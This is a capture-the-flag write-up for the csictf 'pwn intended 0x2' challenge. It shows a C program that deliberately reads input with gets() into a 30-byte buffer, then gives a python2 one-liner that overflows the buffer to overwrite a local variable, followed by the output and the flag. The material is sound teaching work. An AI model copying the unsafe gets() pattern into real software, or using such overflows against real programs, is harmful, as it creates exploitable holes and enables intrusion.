# pwn intended 0x2

Author: [roerohan](https://github.com/roerohan)

## Description

Buffer overflow to overwrite a variable in the same function.

## Requirements

- Basic Knowledge of Buffer Overflow

## Sources

- [pwn-intended-0x2](./bin/pwn-intended-0x2): Binary
- [pwn-intended-0x2.c](./bin/pwn-intended-0x2.c)

```c
#include <stdio.h>

int main() {
    int check = 0;
    char teleport[30];

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);

    puts("Welcome to csictf! Where are you headed?");
    gets(teleport);

    puts("Safe Journey!");
    if (check == 0xcafebabe) {
        puts("You've reached your destination, here's a flag!");
        system("cat flag.txt");
    }
}
```

```
Travelling through spacetime!
```

## Exploit

Similar to the [pwn-intended-0x1](./pwn%20intended%200x1) challenge, there is an array of `30 bytes`. The array `teleport` can be overflowed since the `gets()` function is used to read from it. Like in the previous challenge, the integer variable will occupy the last `4 bytes` before the `saved rbp`. The stack is of size 48, since that's the closest multiple of 16 after `30 + 4`.
<br />

The goal is to overwrite those last 4 bytes with `0xcafebabe`, but in little endian format. We can use `python2` to do this for us.

```bash
$ python2 -c "print 'a'*44 + '\xbe\xba\xfe\xca'" | ./pwn-intended-0x2
Welcome to csictf! Where are you headed?
Safe Journey!
You've reached your destination, here's a flag!
csictf{c4n_y0u_re4lly_telep0rt?}%
```

The flag is:

```
csictf{c4n_y0u_re4lly_telep0rt?}
```